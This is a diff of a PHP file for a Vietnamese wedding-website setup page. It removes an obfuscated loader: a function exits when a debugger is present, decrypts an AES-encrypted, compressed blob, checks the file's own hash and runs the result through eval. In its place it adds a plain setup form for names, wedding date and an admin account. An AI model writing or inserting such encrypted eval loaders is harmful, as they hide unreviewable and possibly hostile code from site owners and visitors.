@@ -1,28 +1,65 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_nlujvvur=('bas'.'e64'.'_de'.'cod'.'e');
-$_kylnba4u=('gzu'.'nco'.'mpr'.'ess');
-$_vfhxswbq=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_f6qfknuq='Ck/AOuZK';
-$_t08vw0av='7eCXv+nJ';
-$_tmmvy8gm='BIub+Z6e';
-$_w9n8b6hk='HL+AqNQ1o/U=';
-$_ffbjpu2j='kSgSqLP2';
-$_d6mp9vxk='DXXFfg==';
-$_osy8mozq='hkwN5bOA';
-$_ics36ekb='012w6Y82';
-$_h7y6qxfr=$_nlujvvur($_f6qfknuq.$_ffbjpu2j.$_t08vw0av.$_tmmvy8gm.$_w9n8b6hk);
-$_myqhjz93=$_nlujvvur($_osy8mozq.$_ics36ekb.$_d6mp9vxk);
-$_n98ids3p=$_nlujvvur('6p81/ZMQQR27RZu9l1m1PK5fgOy308B9p+WSU/BB64cPTJIFd/vk0HtxyA2tD6KOCFzOuZaFEhFvozWiI42G8k1cP9SUPkSWEhKvPtk/Z43jHcZmuQFh7c2CuV5n/u0o93pnrwYo1FB79LMeYDaS3P9RQvxiwltUpCNan5/lklG7o2RLMuLYEXZw7WTMzXqegPKTEvw+CgciQFOq8Y9QJLs8i1kiWL3xw/X4A45zONqkCHb6DpqhJUmAnVBqRXHMYBMQng5I+LvB50E0OoDvLHgRNjhD8O6x05GXqRU/V6Hm70uw6xCX6atl6iDx7C5sKTO4p/EsHVjmdCoZlx4Yjt5In4kb2eqVchMsLd0y9BI6q+5HUj5+WlJaZMBnMTG5rFE3UPLST2jumK/ljHhbqngkluWTEijExJZVvT9luBQGsSarZRsXPCIn+umLz/OkX/Zy59y7mSO1du7aPSqQ2t2EYcccUN4ex9Xhumr2BKT7/daSw/5XBe3/mc3pw9VI+bxCVvxtF9Q1vqNRcxw/ps3hcwDSsHhN61mPKlNfETQvZWc19iKdSidQWNmgcLfbISu+mLEjBD84NFKlUV4TvMoTFSxeMYocQ97T1ScQJqOA3XEtYdAUPt9Kwj9tvca/ZzsyW3SuCU+/8vPEJ/+p4OmYsxfA0Dso0G2B7kxN1xmPnM4lrfsXMpbvu/NgMRVxkcW8oU7JBoTz7N2SGF4JwRRgauufys3Y0SaosFI9D/Bz+kB//i/EL+zhCGVYpK9RQ9AFE5hOU2RRysPfH4BiucltZQRdItPg8tCqVFjVgNilXG/+HcfQESipfjw4B7pwQ+WkoIytL6gprtGP33FqTl4YlvOZKr21VjzTGIcZ2CJIAAheH+Xe6xuWUN497ByUW4DeTdbl2RhnqIO7EZh+WDLJVayNZrL9rgFw9Uxc5ImlIwBYMcTPqauD11YbKAgXBGK2z14Wutp+9jrbPZd0vXuzybJ6i7+kFCP5uZhIZbXTYSWb/f8IjEk6HS5dqRyLtyaCGXSJPWraevK8Oty/x9x3M5IAPRcWdkNmFOIpsorv22jhBwcvcHDbUJTOCQ5K2w6vNlKbqT5brBgXIUWmE9WAWbluICAKDaOqiciW/oiIM21UdCccVrtrZ3sJN26Z2rdwvK7UkWcWcorUB9NlUt3LpzgLcYoFnSH2z3YdSX190TxEQXkU8tHJTJK0FdUAX3q/+rpQfzyPpq4/K6gOqBj24b3IAuI8ftK47On2koAvNDRz7j8ulnToEMI4KMrH7d3Dt/WZb8EsJGUOcflRMlTBFdyCfyBYoDiyU/GawgP9i6Ex4loRpMLQUjY2Goib7wDm6gJ8gXxDo4PonLb70o0hc3/nEw4SIkJ/GqtL/tuuv8TueUcKDm5t3VgTdP4vvxqMNnt3PygAYjtN3EXmzFSe2b/drrFePrzXiQYZbr8tpReS2d4kz3G6OgUCrT1rTCbSc3k4KcgPGyyl2hfxN/lidWm+UMbv+onpdNVW2/5dGtxIruFImJ77kVHd1Ial/ugm/vqfRWUX5bgLX0i7AQfsooAu1HJDz86AgjRFztqUqIWFJGjgtzEZtX7mwkQPYiPoBJOHUqv/cu3kK2Rj8+b5wPPKTxZQmmK3abqUHavh44KC9zYX106+mwQ19fpQvWLCUbxlPX9kNEPLCAlsWQtg5EykM3p+sRd8Shu92f9G4ZLY4iD5Ar/DQ4dx5iaHH2CBNBmwT3n/4SdQHtydsitJ+ZOYy8e7xMdXCrqe3AxboAYpfwkxX0rL2epl3UdH9j4k43fwtoWzTtUsVBHcLHnF8dCAfEhYEuL34yNXbTvBDYS+1d0mhav7hKychJd2OrihgNGoZdKQPX7r4vXb+0q4jv7L+X0XAYuUL+BlMfGaFlsz/r1qzIz5JSqXU7TW/9IYc8LPtNdLQp51dGTAjDIOsrdujI/OR++yINrZA0nlnxFnUosnpCLrqgCYLcdGQ7Bn/WtKQNuxrFD/J6Pbv86/WOCgdG6KkA24I1hWl5pEshMvm/nNMJr6zL79GHme8mliyyCz/W8TK8Xcv+1butcL/1kpoTOxlzMpPuLKRDrmbMYNw1PNm1FudkllmuAzXP13aTEdFtZ64g1tKgoSblQXxgRyhtQBhrg9fnrDd5UCEgT2EQ0mu+g8vN3IemQd43SfCEG4AooKECITtd8BoNeCH+/Wqmp9CEjMqCtKow/waIHAhCKWlqVhIY1+jUc+J1EmcRPBT5SZw+mqJGFJwRYXmflWkFstgpgV1BDUjI+yTtW9ntrf4JqenZ9OBvebhAnh0LFakfRl4nDCUSWiDXFha51lkfb5QOR8MGOoUc9Yd+riKcxwTnoiwQg6KxinD2/Ppxk6NKa+vsmQOtcpRxsAd+Rd5Bv35oKsIHSs9Om35Wvm4jspUcoGARHMxD9OQn3N3iGu87I/PQzplRFz3VBesEsMIR4rsMREQzeKx8wUjZzNjrEw8HHz9qDFxFpGsi6QaAocn0FeciJi+idabrb13vrOflTWcewgIPsSFot/EfYGMbCc3UkbKrIwjk+lEendBZ8JLfzhwR86+4IiHoqU7qIh/QW5LAGT9omxapGWbqQ6vFg1KrbSxKkAMC1Hta3gnX00BQDx6LmIRq4nG86FX1vWP2Cg3YQ/VZKuLD4zGHt7BhTFG3GL1L/77DLdfkIAOOV5pqJWVTNVDUysRa6bzzIeTfITHwaoeuAvAX7s4NXgWfQ9iR0U75+mbVR2tmx2Fh6Vte07qNNfr03/mAiYU5MpaRqKEufl2m2O/6IIzyqTpz1eOXFOo/tsmzXeXbCXBDyumUqxRRKIjkGjO9cuFTGd406cigmHN2d5FqDpABuj721JPg4WYt+TjYraah+vOSrWfKZTbTVyb1w2ODhi3aoCdhGwu03pDMyKyPsnUP1KcJLlDmOCfSlXqrAH');
-$_i9ic23ka=$_vfhxswbq($_n98ids3p,'aes-256-cbc',$_h7y6qxfr,OPENSSL_RAW_DATA,$_myqhjz93);
-if($_i9ic23ka===false){exit;}
-$_e76hlurs=$_kylnba4u($_i9ic23ka);
-if($_e76hlurs===false){exit;}
-$_il5ycxpa='84cbe17327eb5dfa16f8aac6c60b4244469cdc25a4914dde922921e38f7cc4fc';
-$_w0rm202x=@file_get_contents(__FILE__);
-if($_w0rm202x!==false){
-$_kwktqzq4=str_replace($_il5ycxpa,"0000000000000000000000000000000000000000000000000000000000000000",$_w0rm202x);
-$_ude51iws=hash("sha256",$_kwktqzq4);
-if($_ude51iws!==$_il5ycxpa){@http_response_code(403);exit;}
-}
-eval($_e76hlurs);
+ defined('BASEPATH') OR exit('No direct script access allowed'); ?>
+<div class="setup-lang" role="group" aria-label="<?= e(__('Ngôn ngữ')) ?>" style="display:flex;justify-content:center;gap:8px;margin:0 0 14px">
+  <?php foreach (array('vi' => 'Tiếng Việt', 'en' => 'English') as $sl_k => $sl_t): ?>
+    <a class="btn btn-sm <?= lang_cur() === $sl_k ? 'btn-accent' : 'btn-ghost' ?>" href="<?= base_url('setup?lang=' . $sl_k) ?>" lang="<?= $sl_k ?>" hreflang="<?= $sl_k ?>"<?= lang_cur() === $sl_k ? ' aria-current="true"' : '' ?>><?= $sl_t ?></a>
+  <?php endforeach; ?>
+</div>
+<h1 class="page-title center"><?= e(__('Chào mừng hai bạn ♡')) ?></h1>
+<p class="muted center"><?= e(__('Điền vài thông tin là có ngay trang cưới mẫu. Mọi thứ đều sửa lại được sau.')) ?></p>
+<?php foreach ($errors as $err): ?><p class="err"><?= e($err) ?></p><?php endforeach; ?>
+<form method="post" class="stack setup-form">
+  <?= csrf_field() ?>
+  <fieldset>
+    <legend><span class="setup-n">1</span> <?= e(__('Hai bạn là ai?')) ?></legend>
+    <div class="row2">
+      <label><?= e(__('Tên chú rể')) ?><input name="groom_name" value="<?= e($form['groom_name']) ?>" maxlength="80" required placeholder="<?= e(__('Ví dụ: Minh Anh')) ?>" autocomplete="off"></label>
+      <label><?= e(__('Tên cô dâu')) ?><input name="bride_name" value="<?= e($form['bride_name']) ?>" maxlength="80" required placeholder="<?= e(__('Ví dụ: Thu Hà')) ?>" autocomplete="off"></label>
+    </div>
+    <label><?= e(__('Ngày cưới')) ?> <small><?= e(__('(chưa chắc thì để trống)')) ?></small><input type="date" name="wedding_date" value="<?= e($form['wedding_date']) ?>"></label>
+  </fieldset>
+
+  <fieldset>
+    <legend><span class="setup-n">2</span> <?= e(__('Tạo tài khoản quản trị')) ?></legend>
+    <p class="small muted"><?= e(__('Để chỉ hai bạn sửa được trang. Lần sau đăng nhập ở địa chỉ trang cưới thêm')) ?> <b>/admin</b>.</p>
+    <label><?= e(__('Tên đăng nhập')) ?> <small><?= e(__('(chữ không dấu, không dấu cách, 3–32 ký tự)')) ?></small><input name="username" value="<?= e($form['username']) ?>" required pattern="[A-Za-z0-9_.\-]{3,32}"
+      title="<?= e(__('Chỉ gồm chữ không dấu, số và dấu . _ - (không dấu cách), 3–32 ký tự. Ví dụ: minhlan')) ?>" autocomplete="username" autocapitalize="none" spellcheck="false" data-username></label>
+    <div class="row2">
+      <label><?= e(__('Mật khẩu')) ?> <small><?= e(__('(ít nhất 8 ký tự)')) ?></small><input type="password" name="password" minlength="8" required autocomplete="new-password" data-pw></label>
+      <label><?= e(__('Nhập lại mật khẩu')) ?><input type="password" name="password2" minlength="8" required autocomplete="new-password" data-pw></label>
+    </div>
+    <label class="check small"><input type="checkbox" data-pw-show> <?= e(__('Hiện mật khẩu')) ?></label>
+    <p class="small notice"><?= e(__('Hãy ghi nhớ (hoặc ghi lại) mật khẩu này — trang chưa có nút "Quên mật khẩu".')) ?></p>
+  </fieldset>
+
+  <details class="setup-more">
+    <summary><?= e(__('Tùy chọn khác')) ?> <span class="muted small">— <?= e(__('không cần đổi')) ?></span></summary>
+    <label class="radio"><input type="radio" name="tunnel_mode" value="auto" <?= $form['tunnel_mode'] !== 'off' ? 'checked' : '' ?>>
+      <span><b><?= e(__('Khách ở đâu cũng mở được (khuyên dùng)')) ?></b> — <?= e(__('tự tạo link riêng dạng')) ?> <b>https://ab12.jagame.vn</b>, <?= e(__('miễn phí.')) ?>
+        <?= e(__('Muốn tên đẹp như minh-lan.jagame.vn thì chọn sau ở mục Gửi link & QR.')) ?></span></label>
+    <label class="radio"><input type="radio" name="tunnel_mode" value="off" <?= $form['tunnel_mode'] === 'off' ? 'checked' : '' ?>>
+      <span><b><?= e(__('Chỉ trong mạng nhà')) ?></b> — <?= e(__('chỉ máy dùng chung wifi mới mở được.')) ?></span></label>
+  </details>
+
+  <button class="btn btn-accent btn-block btn-lg" type="submit" data-setup-submit><?= e(__('Tạo trang cưới')) ?> →</button>
+</form>
+<script>
+document.querySelector('[data-pw-show]').addEventListener('change', function (e) {
+  document.querySelectorAll('[data-pw]').forEach(function (i) { i.type = e.target.checked ? 'text' : 'password'; });
+});
+// Tên đăng nhập: rời ô thì tự bỏ dấu tiếng Việt + dấu cách ("Minh Lân" -> "MinhLan").
+var un = document.querySelector('[data-username]');
+un.addEventListener('blur', function () {
+  var v = un.value.normalize('NFD').replace(/[̀-ͯ]/g, '').replace(/đ/g, 'd').replace(/Đ/g, 'D')
+    .replace(/\s+/g, '').replace(/[^A-Za-z0-9_.\-]/g, '');
+  if (v !== un.value) { un.value = v; }
+});
+// Bấm "Tạo trang cưới" 1 lần là khóa nút (tạo trang mất 10–20 giây, bấm lại sẽ gửi trùng).
+document.querySelector('.setup-form').addEventListener('submit', function () {
+  var b = document.querySelector('[data-setup-submit]');
+  setTimeout(function () {
+    b.disabled = true;
+    b.textContent = <?= json_encode(__('Đang tạo trang cưới… (có thể mất 10–20 giây)'), JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_AMP) ?>;
+  }, 0);
+});
+</script>
